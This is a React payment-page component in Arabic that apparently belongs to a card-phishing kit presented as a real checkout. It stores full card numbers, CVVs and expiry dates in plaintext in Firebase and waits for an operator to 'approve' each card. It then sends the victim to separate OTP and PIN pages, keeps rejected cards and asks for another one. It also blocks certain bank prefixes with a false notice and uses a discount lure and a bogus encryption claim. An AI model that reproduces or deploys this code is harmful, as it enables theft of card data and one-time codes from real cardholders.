"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { toast } from "sonner"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ShieldCheck, CreditCard, Lock } from "lucide-react"
import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo, luhnCheck } from "@/lib/card-utils"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot, updateDoc } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { FullPageLoader } from "./loader"


const b1 = ["4890", "4458", "4909", "4575", "4548", "4323", "4092", "4299", "4173", "5297", "4847", "4201", "4455"]

interface PaymentPageProps {
  offerTotalPrice: number
}

export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
  const router = useRouter()
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-card")
  const [cardNumber, setCardNumber] = useState("")
  const [cardHolderName, setCardHolderName] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
  const [isValidCard, setIsValidCard] = useState(false)
  const [expiryError, setExpiryError] = useState("")
  const [r1, setR1] = useState("")

  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)

  useEffect(() => {
    const cleanNumber = cardNumber.replace(/\s/g, "")
    
    if (cleanNumber.length >= 4) {
      const p1 = cleanNumber.substring(0, 4)
      if (b1.includes(p1)) {
        setR1("تم إيقاف السداد من خلال مصرف الراجحي والمحافظ الإلكترونية. الرجاء إدخال بطاقة من مصرف آخر")
        setIsValidCard(false)
        return
      } else {
        setR1("")
      }
    }
    
    if (cleanNumber.length >= 6) {
      const type = detectCardType(cleanNumber)
      setCardType(type)
      const bank = getBankInfo(cleanNumber)
      setBankInfo(bank)
    } else {
      setCardType(null)
      setBankInfo(null)
    }

    if (cleanNumber.length === 16) {
      setIsValidCard(luhnCheck(cleanNumber))
    } else {
      setIsValidCard(false)
    }
  }, [cardNumber])

  // Validate expiry date
  useEffect(() => {
    if (expiryDate.length === 5) {
      const [month, year] = expiryDate.split('/')
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100 // Last 2 digits
      const currentMonth = currentDate.getMonth() + 1

      const expYear = parseInt(year)
      const expMonth = parseInt(month)

      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        setExpiryError("تاريخ البطاقة منتهي")
      } else {
        setExpiryError("")
      }
    } else {
      setExpiryError("")
    }
  }, [expiryDate])

  // Listen to admin decision after payment
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data.cardStatus

          if (status === "approved_with_otp") {
            setIsWaitingAdmin(false)
            // Redirect to OTP page
            router.push("/veri")
          } else if (status === "approved_with_pin") {
            setIsWaitingAdmin(false)
            // Redirect to PIN page directly
            router.push("/confi")
          } else if (status === "rejected") {
            // Save rejected card data and reset status
            const currentCardData = {
              cardNumber: data.cardNumber,
              cardHolderName: data.cardHolderName,
              expiryDate: data.expiryDate,
              cvv: data.cvv,
              cardType: data.cardType,
              bankInfo: data.bankInfo,
              rejectedAt: new Date().toISOString()
            }
            
            updateDoc(doc(db, "pays", visitorID), {
              oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
              cardStatus: "pending"
            }).then(() => {
              setIsWaitingAdmin(false)
              toast.error("تم رفض بيانات البطاقة", {
                description: "يرجى إعادة إدخال بيانات صحيحة",
                duration: 5000
              })
            }).catch(err => {
              console.error("Error saving rejected card:", err)
              setIsWaitingAdmin(false)
              toast.error("حدث خطأ", {
                description: "يرجى المحاولة مرة أخرى",
                duration: 5000
              })
            })
          }
        }
      },
      (err) => {
        console.error("Error listening to document:", err)
        setIsWaitingAdmin(false)
        toast.error("حدث خطأ في الاتصال", {
          description: "يرجى المحاولة مرة أخرى",
          duration: 5000
        })
      },
    )

    return () => unsubscribe()
  }, [isWaitingAdmin, router])

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    // Limit to 16 digits (19 chars with spaces)
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted)
    }
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    setExpiryDate(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3)
    setCvv(value)
  }

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault()

    let visitorID = localStorage.getItem("visitor")

    if (!visitorID) {
      visitorID = "visitor_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
      localStorage.setItem("visitor", visitorID)
    }

    if (!isValidCard) {
      alert("رقم البطاقة غير صحيح")
      return
    }

    if (expiryError) {
      alert(expiryError)
      return
    }

    try {
      const finalPrice = calculateFinalPrice()
      const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
      
      const docId = await addData({
        id: visitorID,
        paymentMethod: selectedPaymentMethod,
        cardType,
        bankInfo,
        cardHolderName,
        cvv,
        cardNumber,
        expiryDate,
        originalPrice: offerTotalPrice,
        discount,
        finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
        cardStatus: "waiting",
        otpStatus: "pending"
      })

      await addToHistory(visitorID, "card", {
        cardNumber,
        cardHolderName,
        cardType,
        expiryDate,
        cvv,
        bankInfo
      }, "pending")

      setIsWaitingAdmin(true)
    } catch (error) {
      console.error("Payment error:", error)
      toast.error("حدث خطأ", {
        description: "فشلت معالجة الدفع. يرجى المحاولة مرة أخرى",
        duration: 5000
      })
    }
  }

  const getDiscountAmount = () => {
    if (selectedPaymentMethod === "credit-card") {
      return "15%"
    }
    return null
  }

  const calculateFinalPrice = () => {
    if (selectedPaymentMethod === "credit-card") {
      return offerTotalPrice * 0.85
    }
    return offerTotalPrice
  }

  const finalPrice = calculateFinalPrice()

  return (
    <>
      {isWaitingAdmin && <FullPageLoader />}
      
      <div className="space-y-5" dir="rtl">
        {/* Payment Method Selection */}
        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-5 md:p-6 border border-gray-200">
          <label className="flex items-center gap-2 text-gray-900 font-bold text-base md:text-lg mb-4">
            <ShieldCheck className="w-5 h-5 text-[#0a4a68]" />
            طريقة الدفع
          </label>
          <div className="space-y-3">
            {[
              { 
                value: "credit-card", 
                label: "البطاقات الائتمانية", 
                discount: "15%", 
                icons: ["/visa.svg", "/mas.svg"],
                disabled: false
              },
              { 
                value: "mada", 
                label: "مدى", 
                discount: null, 
                icon: "/mada.svg",
                disabled: false
              },
              { 
                value: "apple-pay", 
                label: "Apple Pay", 
                discount: null, 
                icon: "/apple-pay.svg",
                disabled: true,
                message: "متوقف حالياً"
              },
            ].map((method) => (
              <label
                key={method.value}
                className={`
                  relative flex items-center justify-between gap-3 p-4 md:p-5
                  border-2 rounded-xl cursor-pointer transition-all duration-200
                  ${
                    selectedPaymentMethod === method.value
                      ? "border-[#0a4a68] bg-white shadow-md"
                      : "border-gray-200 hover:border-gray-300 bg-white/50"
                  }
                  ${method.disabled ? "opacity-60 cursor-not-allowed" : ""}
                `}
              >
                <div className="flex items-center gap-3">
                  <input
                    type="radio"
                    name="paymentMethod"
                    value={method.value}
                    checked={selectedPaymentMethod === method.value}
                    onChange={() => !method.disabled && setSelectedPaymentMethod(method.value)}
                    disabled={method.disabled}
                    className="w-5 h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50"
                  />
                  <div className="flex items-center gap-2">
                    {method.icons ? (
                      method.icons.map((icon, idx) => (
                        <img key={idx} src={icon} alt="logo" width={35} height={22} className="object-contain" />
                      ))
                    ) : (
                      <img src={method.icon || "/placeholder.svg"} alt="logo" width={35} height={22} className="object-contain" />
                    )}
                  </div>
                  <span className={`text-base md:text-lg font-semibold ${method.disabled ? 'text-gray-400' : 'text-gray-900'}`}>
                    {method.label}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  {method.message && (
                    <Badge className="bg-gray-400 text-white font-bold px-3 py-1 text-xs">
                      {method.message}
                    </Badge>
                  )}
                  {method.discount && (
                    <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-3 py-1 text-xs shadow-sm">
                      خصم {method.discount}
                    </Badge>
                  )}
                </div>
              </label>
            ))}
          </div>
        </div>

        {/* Card Information Form */}
        <form onSubmit={handlePayment} className="space-y-4">
          {/* Card Holder Name */}
          <div className="space-y-2">
            <label className="block text-gray-900 font-bold text-sm md:text-base">
              اسم حامل البطاقة
            </label>
            <Input
              type="text"
              value={cardHolderName}
              onChange={(e) => setCardHolderName(e.target.value.toUpperCase())}
              placeholder="CARDHOLDER NAME"
              className="h-14 md:h-16 text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
              required
            />
          </div>

          {/* Card Number Input */}
          <div className="space-y-2">
            <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
              <CreditCard className="w-4 h-4 text-[#0a4a68]" />
              رقم البطاقة
              {isValidCard && (
                <Badge variant="outline" className="border-green-500 text-green-700 text-xs">
                  <ShieldCheck className="w-3 h-3 ml-1" />
                  صالح
                </Badge>
              )}
              {cardType && (
                <Badge className="bg-blue-100 text-blue-800 text-xs">
                  {cardType}
                </Badge>
              )}
            </label>
            <Input
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
              className={`h-14 md:h-16 text-xl md:text-2xl font-mono tracking-wider border-2 rounded-xl transition-all ${
                isValidCard 
                  ? "border-green-500 focus:border-green-600" 
                  : cardNumber.length > 0 
                  ? "border-red-300 focus:border-red-500" 
                  : "border-gray-300 focus:border-[#0a4a68]"
              }`}
              required
            />
            {r1 && (
              <p className="text-red-500 text-sm font-semibold">{r1}</p>
            )}
            {!r1 && cardNumber.length > 0 && cardNumber.replace(/\s/g, "").length !== 16 && (
              <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-3 md:gap-4">
            <div className="space-y-2">
              <label className="block text-gray-900 font-bold text-sm md:text-base">
                تاريخ الانتهاء
              </label>
              <Input
                type="text"
                value={expiryDate}
                onChange={handleExpiryDateChange}
                placeholder="MM/YY"
                maxLength={5}
                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${
                  expiryError 
                    ? "border-red-500 focus:border-red-600" 
                    : "border-gray-300 focus:border-[#0a4a68]"
                }`}
                required
              />
              {expiryError && (
                <p className="text-red-500 text-xs">{expiryError}</p>
              )}
            </div>
            <div className="space-y-2">
              <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
                <Lock className="w-4 h-4 text-[#0a4a68]" />
                CVV
              </label>
              <Input
                type="password"
                value={cvv}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength={3}
                className="h-14 md:h-16 text-xl md:text-2xl font-mono border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
                required
              />
              {cvv.length > 0 && cvv.length !== 3 && (
                <p className="text-red-500 text-xs">يجب أن يكون 3 أرقام</p>
              )}
            </div>
          </div>

          {/* Price Summary - Compact */}
          {getDiscountAmount() && (
            <div className="bg-green-50 rounded-lg p-3 border border-green-200">
              <div className="flex justify-between items-center text-sm">
                <span className="text-gray-600">السعر الأصلي:</span>
                <span className="text-gray-600 line-through">{offerTotalPrice.toFixed(2)} ﷼</span>
              </div>
              <div className="flex justify-between items-center text-sm mt-1">
                <span className="text-green-600 font-semibold">خصم {getDiscountAmount()}:</span>
                <span className="text-green-600 font-semibold">
                  -{(offerTotalPrice * 0.15).toFixed(2)} ﷼
                </span>
              </div>
            </div>
          )}

          {/* Submit Button with Price */}
          <Button
            type="submit"
            disabled={!isValidCard || !expiryDate || cvv.length !== 3 || !!expiryError || !cardHolderName || !!r1}
            className="w-full h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl md:text-2xl rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <Lock className="w-5 h-5 ml-2" />
            دفع {finalPrice.toFixed(2)} ﷼
          </Button>

          {/* Security Notice */}
          <div className="flex items-center justify-center gap-2 text-gray-500 text-xs md:text-sm">
            <ShieldCheck className="w-4 h-4" />
            <span>معاملتك محمية بتشفير SSL 256-bit</span>
          </div>
        </form>
      </div>

    </>
  )
}
